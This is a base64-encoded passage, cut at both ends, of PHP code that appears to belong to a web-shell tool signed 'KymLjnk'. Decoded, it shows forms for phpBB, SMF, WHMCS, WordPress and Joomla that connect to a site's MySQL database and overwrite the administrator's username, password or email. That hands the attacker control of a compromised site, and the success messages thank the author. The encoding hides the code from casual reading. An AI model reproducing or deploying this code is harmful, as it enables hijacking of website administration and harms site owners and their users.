J107CgokcHNwaHA9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHBzcGhwKTsKJHBhc3NfcGhwID0gJF9QT1NUWydwc3BocCddOwokc2V0X3BzcGhwID0gbWQ1KCRwYXNzX3BocCk7CgokcGhwX3ByZWZpeCA9ICRfUE9TVFsncHJwaHAnXTsKCiR0YWJsZV9uYW1lMiA9ICRwaHBfcHJlZml4LiJ1c2VycyIgOwoKJGxlY29uZ3RoaWVuNSA9ICJVUERBVEUgJHRhYmxlX25hbWUyIFNFVCB1c2VybmFtZV9jbGVhbiA9JyIuJHNldF91cnBocC4iJyBXSEVSRSB1c2VyX2lkID0nMiciOwokbGVjb25ndGhpZW42ID0gIlVQREFURSAkdGFibGVfbmFtZTIgU0VUIHVzZXJfcGFzc3dvcmQgPSciLiRzZXRfcHNwaHAuIicgV0hFUkUgdXNlcl9pZCA9JzInIjsKCiRvazM9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjUpOwokb2szPUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW42KTsKCmlmKCRvazMpewplY2hvICI8c2NyaXB0PmFsZXJ0KCdwaHBCQiB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1NNRgppZiAoaXNzZXQoJF9QT1NUWydzbWYnXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIFNNRiBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2luZGV4LnBocD9hY3Rpb249YWRtaW48YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL1NldHRpbmdzLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmhzbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXNtZiB0eXBlPXRleHQgbmFtZT1kYm5zbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1c21mIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHBhc3N3b3JkPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9YWRtaW4gdHlwZT1wYXNzd29yZCBuYW1lPWRicHNtZiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJzbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIEUtbWFpbCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXlvdXItZW1haWxAeHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbXNtZiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5UYWJsZSBwcmVmaXg8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1zbWZfIHR5cGU9dGV4dCBuYW1lPXByc21mIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHNtZiA9ICRfUE9TVFsnZGJoc21mJ107CiRkYm5zbWYgID0gJF9QT1NUWydkYm5zbWYnXTsKJGRidXNtZiA9ICRfUE9TVFsnZGJ1c21mJ107CiRkYnBzbWYgID0gJF9QT1NUWydkYnBzbWYnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHNtZiwkZGJ1c21mLCRkYnBzbWYpOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5zbWYpOwoKJHVyc21mPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnNtZik7CiRzZXRfdXJzbWYgPSAkX1BPU1RbJ3Vyc21mJ107CgokZW1zbWY9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGVtc21mKTsKJHNldF9lbXNtZiA9ICRfUE9TVFsnZW1zbWYnXTsKCiRzbWZfcHJlZml4ID0gJF9QT1NUWydwcnNtZiddOwoKJHRhYmxlX25hbWUzID0gJHNtZl9wcmVmaXguIm1lbWJlcnMiIDsKCiRsZWNvbmd0aGllbjcgPSAiVVBEQVRFICR0YWJsZV9uYW1lMyBTRVQgbWVtYmVyX25hbWUgPSciLiRzZXRfdXJzbWYuIicgV0hFUkUgaWRfbWVtYmVyID0nMSciOwokbGVjb25ndGhpZW44ID0gIlVQREFURSAkdGFibGVfbmFtZTMgU0VUIGVtYWlsX2FkZHJlc3MgPSciLiRzZXRfZW1zbWYuIicgV0hFUkUgaWRfbWVtYmVyID0nMSciOwoKJGxlY29uZ3RoaWVuNyA9ICJVUERBVEUgJHRhYmxlX25hbWUzIFNFVCBtZW1iZXJOYW1lID0nIi4kc2V0X3Vyc21mLiInIFdIRVJFIElEX01FTUJFUiA9JzEnIjsKJGxlY29uZ3RoaWVuOCA9ICJVUERBVEUgJHRhYmxlX25hbWUzIFNFVCBlbWFpbEFkZHJlc3MgPSciLiRzZXRfZW1zbWYuIicgV0hFUkUgSURfTUVNQkVSID0nMSciOwoKJG9rND1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuNyk7CiRvazQ9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjgpOwoKaWYoJG9rNCl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1NNRiB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1dITUNTCmlmIChpc3NldCgkX1BPU1RbJ3dobWNzJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBXSE1DUyBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluPGJyPlBhdGggQ29uZmlnIDogW3BhdGNoXS9jb25maWd1cmF0aW9uLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmh3aG0gc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdobWNzIHR5cGU9dGV4dCBuYW1lPWRibndobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV3aG0gc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwd2htIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSB1c2VyIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXRleHQgbmFtZT11cndobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3dobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdDaGFuZ2UnID48L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+IjsKfWVsc2V7CiRkYmh3aG0gPSAkX1BPU1RbJ2RiaHdobSddOwokZGJud2htICA9ICRfUE9TVFsnZGJud2htJ107CiRkYnV3aG0gPSAkX1BPU1RbJ2RidXdobSddOwokZGJwd2htICA9ICRfUE9TVFsnZGJwd2htJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh3aG0sJGRidXdobSwkZGJwd2htKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJud2htKTsKCiR1cndobT1zdHJfcmVwbGFjZSgiXCciLCInIiwkdXJ3aG0pOwokc2V0X3Vyd2htID0gJF9QT1NUWyd1cndobSddOwoKJHBzd2htPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3dobSk7CiRwYXNzX3dobSA9ICRfUE9TVFsncHN3aG0nXTsKJHNldF9wc3dobSA9IG1kNSgkcGFzc193aG0pOwoKJGxlY29uZ3RoaWVuOSA9ICJVUERBVEUgdGJsYWRtaW5zIFNFVCB1c2VybmFtZSA9JyIuJHNldF91cndobS4iJyBXSEVSRSBpZCA9JzEnIjsKJGxlY29uZ3RoaWVuMTAgPSAiVVBEQVRFIHRibGFkbWlucyBTRVQgcGFzc3dvcmQgPSciLiRzZXRfcHN3aG0uIicgV0hFUkUgaWQgPScxJyI7Cgokb2s1PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW45KTsKJG9rNT1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTApOwoKaWYoJG9rNSl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1dITUNTIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KCi8vV29yZFByZXNzCmlmIChpc3NldCgkX1BPU1RbJ3dvcmRwcmVzcyddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgV29yZFByZXNzIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vd3AtYWRtaW48YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL3dwLWNvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJod3Agc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdvcmRwcmVzcyB0eXBlPXRleHQgbmFtZT1kYm53cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnB3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJ3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3dwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdwXyB0eXBlPXRleHQgbmFtZT1wcndwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHdwID0gJF9QT1NUWydkYmh3cCddOwokZGJud3AgID0gJF9QT1NUWydkYm53cCddOwokZGJ1d3AgPSAkX1BPU1RbJ2RidXdwJ107CiRkYnB3cCAgPSAkX1BPU1RbJ2RicHdwJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh3cCwkZGJ1d3AsJGRicHdwKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJud3ApOwoKJHVyd3A9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVyd3ApOwokc2V0X3Vyd3AgPSAkX1BPU1RbJ3Vyd3AnXTsKCiRwc3dwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3dwKTsKJHBhc3Nfd3AgPSAkX1BPU1RbJ3Bzd3AnXTsKJHNldF9wc3dwID0gbWQ1KCRwYXNzX3dwKTsKCiR3cF9wcmVmaXggPSAkX1BPU1RbJ3Byd3AnXTsKCiR0YWJsZV9uYW1lNCA9ICR3cF9wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4xMSA9ICJVUERBVEUgJHRhYmxlX25hbWU0IFNFVCB1c2VyX2xvZ2luID0nIi4kc2V0X3Vyd3AuIicgV0hFUkUgSUQgPScxJyI7CiRsZWNvbmd0aGllbjEyID0gIlVQREFURSAkdGFibGVfbmFtZTQgU0VUIHVzZXJfcGFzcyA9JyIuJHNldF9wc3dwLiInIFdIRVJFIElEID0nMSciOwoKJG9rNj1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTEpOwokb2s2PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xMik7CgppZigkb2s2KXsKZWNobyAiPHNjcmlwdD5hbGVydCgnV29yZFByZXNzIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KCi8vSm9vbWxhCmlmIChpc3NldCgkX1BPU1RbJ2pvb21sYSddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgSm9vbWxhIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vYWRtaW5pc3RyYXRvcjxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vY29uZmlndXJhdGlvbi5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJoam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1qb29tbGEgdHlwZT10ZXh0IG5hbWU9ZGJuam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHVzZXI8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1yb290IHR5cGU9dGV4dCBuYW1lPWRidWpvcyBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnBqb3Mgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVyam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBwYXNzd29yZCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT1wYXNzd29yZCBuYW1lPXBzam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWpvc18gdHlwZT10ZXh0IG5hbWU9cHJqb3Mgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nQ2hhbmdlJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn1lbHNlewokZGJoam9zID0gJF9QT1NUWydkYmhqb3MnXTsKJGRibmpvcyAgPSAkX1BPU1RbJ2RibmpvcyddOwokZGJ1am9zID0gJF9QT1NUWydkYnVqb3MnXTsKJGRicGpvcyAgPSAkX1BPU1RbJ2RicGpvcyddOwogICAgICAgICBAbXlzcWxfY29ubmVjdCgkZGJoam9zLCRkYnVqb3MsJGRicGpvcyk7CiAgICAgICAgIEBteXNxbF9zZWxlY3RfZGIoJGRibmpvcyk7CgokdXJqb3M9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVyam9zKTsKJHNldF91cmpvcyA9ICRfUE9TVFsndXJqb3MnXTsKCiRwc2pvcz1zdHJfcmVwbGFjZSgiXCciLCInIiwkcHNqb3MpOwokcGFzc19qb3MgPSAkX1BPU1RbJ3Bzam9zJ107CiRzZXRfcHNqb3MgPSBtZDUoJHBhc3Nfam9zKTsKCiRqb3NfcHJlZml4ID0gJF9QT1NUWydwcmpvcyddOwoKJHRhYmxlX25hbWU1ID0gJGpvc19wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4xMyA9ICJVUERBVEUgJHRhYmxlX25hbWU1IFNFVCB1c2VybmFtZSA9JyIuJHNldF91cmpvcy4iJyBXSEVSRSBpZCA9JzYyJyI7CiRsZWNvbmd0aGllbjE0ID0gIlVQREFURSAkdGFibGVfbmFtZTUgU0VUIHBhc3N3b3JkID0nIi4kc2V0X3Bzam9zLiInIFdIRVJFIGlkID0nNjInIjsKCiRvazc9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjEzKTsKJG9rNz1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTQpOwoKaWYoJG9rNyl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ0pvb21sYSB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1BIUC1OVUtFCmlmIChpc3NldCgkX1BPU1RbJ3BocC1udWtlJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdp